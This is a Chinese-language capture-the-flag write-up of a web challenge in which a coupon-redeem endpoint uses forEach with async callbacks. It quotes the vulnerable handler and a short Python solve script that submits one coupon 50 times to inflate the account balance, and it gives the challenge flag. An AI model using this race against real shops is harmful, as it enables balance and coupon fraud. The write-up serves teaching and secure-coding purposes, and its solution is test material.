# BSidesAlgiers2025 - Expensive Shop

## 题目简述

这是一个典型的“积分券+购物”Web 题。服务允许注册/登录后访问首页，首页展示可售卖物品与红包券，`/buy` 端点用于扣减 `balance` 购买，`/redeem` 用于把券额度加到账户余额。题目目标是拿到 `flag` 商品（`price: 9999`）返回的 flag。

源码关键点（可复现）：

- `COUPONS` 常量定义可用券及其数值：`WELCOME`/`BSIDESALGIERS`/`SALES2025`；
- 数据库有 `redemptions(user_id, coupon_code)`，以 `(user_id, coupon_code)` 为主键，理论上应防止重复使用同一优惠券；
- `POST /redeem` 采用：
  - `req.body.coupons` 统一转数组；
  - `forEach(async (couponCode) => { ... SELECT ...; INSERT ...; UPDATE ... })`；
- 因为 `forEach` 不按 async 顺序等待，数据库查询/写入可在并发中“同时读到未提交状态”。

该题的核心机制是：**同一请求中重复提交同一券名会触发竞态条件**，绕过原本应阻止的幂等检查。

## 解题过程

### 关键观察

`redeem` 的关键逻辑（源码）：

```javascript
app.post('/redeem', async (req, res) => {
    if (!req.user) return res.status(403).json({ error: 'Not authorized' });

    let coupons = req.body.coupons;
    if (!Array.isArray(coupons)) {
        coupons = [coupons];
    }

    coupons.forEach(async (couponCode) => {
        if (COUPONS[couponCode]) {
            const redeemed = await db.get(
                'SELECT * FROM redemptions WHERE user_id = ? AND coupon_code = ?',
                [req.user.id, couponCode]
            );
            if (!redeemed) {
                req.user.balance += COUPONS[couponCode];
                try {
                    await db.run('INSERT INTO redemptions (user_id, coupon_code) VALUES (?, ?)', [req.user.id, couponCode]);
                    await updateUserInDb(req.user);
                } catch (err) {
                }
            }
        }
    });

    res.json({ success: true, message: 'Coupon Redeemed Sucessfully' });
});
```

`forEach` 对 async 回调不等待，几次遍历可并发执行，`SELECT` 读到的 `redemptions` 均可能是“尚未插入”。

### 求解步骤（可复现）

1. 注册并登录任意账户后，向 `/redeem` 发送多份同券名数组。
2. 触发多次同券并发记账。
3. 余额增长后调用 `/buy` 购买 `flag`。

官方给出的求解脚本核心片段是：

```python
session.post(f"{url}/register", data={"username": username, "password": password})
session.post(f"{url}/login", data={"username": username, "password": password})

coupons_payload = {
    "coupons": ["BSIDESALGIERS"] * 50
}

session.post(f"{url}/redeem", json=coupons_payload)
response = session.post(f"{url}/buy", json={"item": "flag"})
print(response.json()["message"])
```

### 验证

当购买成功时，`/buy` 返回：

`shellmates{e4sy_RacE_F0rE4cH_1S_Not_For_asYNChrOUNoUs_PrOGrAMMing}`

## 方法总结

- 核心技巧：识别并利用 `forEach(async ...)` 与 DB 并发写入之间的竞态，绕过 `redemptions` 的重复兑换防护。
- 识别信号：出现“查询是否存在 + 再插入 + 更新”在同一循环内、但没有事务/锁或顺序等待。
- 复用要点：这类逻辑要重点核对是否存在 `await` 丢失、Promise 并行化、行级/请求级幂等窗口；对 `redemptions` 场景应加唯一约束前的事务封装与原子更新。
